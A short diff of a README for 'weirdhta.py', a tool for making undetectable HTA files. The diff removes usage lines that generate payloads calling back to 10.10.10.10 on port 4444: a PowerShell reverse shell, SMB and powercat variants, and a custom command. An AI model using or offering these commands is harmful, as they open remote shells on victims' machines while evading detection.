@@ -4,11 +4,6 @@ A Python-based basic tool for creating undetectable hta file.
 
 ```
 python3 --help
-python3 weirdhta.py 10.10.10.10 4444 --normal (for normal powershell reverse_shell)
-python3 weirdhta.py 10.10.10.10 4444 --smb (without powershell payload, it will use smb)
-python3 weirdhta.py 10.10.10.10 4444 --powercat (for powercat)
-python3 weirdhta.py 10.10.10.10 4444 --command 'c:\windows\system32\cmd.exe' (custom command)
-
 ```
 
 ### Screenshots
